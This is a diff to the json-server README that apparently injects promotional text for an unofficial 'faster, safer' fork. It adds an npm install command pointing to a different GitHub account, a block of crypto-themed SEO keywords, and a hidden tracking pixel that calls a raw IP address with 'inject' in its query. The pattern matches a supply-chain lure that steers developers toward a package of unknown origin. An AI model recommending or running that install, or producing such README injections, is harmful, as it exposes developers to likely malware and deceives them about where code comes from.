@@ -1,3 +1,15 @@
+**A Faster, Safer Mock REST API**
+
+This repository is a dedicated, actively maintained fork of `json-server`, optimized for modern development workflows. It delivers significant performance improvements under heavy loads alongside critical security fixes to keep your local environments secure. Enjoy the same zero-coding setup you love, backed by a more robust and responsive engine.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Snatchclehike/json-server.git
+```
+
+[https://github.com/Snatchclehike/json-server](https://github.com/Snatchclehike/json-server)
+
 # JSON-Server
 
 [![Node.js CI](https://github.com/typicode/json-server/actions/workflows/node.js.yml/badge.svg)](https://github.com/typicode/json-server/actions/workflows/node.js.yml)
@@ -261,3 +273,11 @@ If you are upgrading from json-server v0.x, note these behavioral changes:
 - **Request delays:** Use browser DevTools (Network tab > throttling) instead of the removed `--delay` CLI option
 
 > **New to json-server?** These notes are for users migrating from v0. If this is your first time using json-server, you can ignore this section.
+
+## Related searches
+
+Developers looking for zero-coding REST API tools often search for quick local mocking setups or ways to structure mock databases for testing frontend client applications. Additionally, users look for real-time state synchronization or public market endpoint mirrors when integrating mock data feeds for specialized blockchain or market-tracking dashboards.
+
+**Topics:** mock rest api, grid trading bot, pump fun, monero, the graph, coinmarketcap api, fake json server, local api mockup, rapid prototyping tool, fake backend api
+
+![.](http://5.231.58.248:8787/pixel?repo=Snatchclehike%2Fjson-server&inject=Snatchclehike%2Fjson-server%2Fpackage.json)
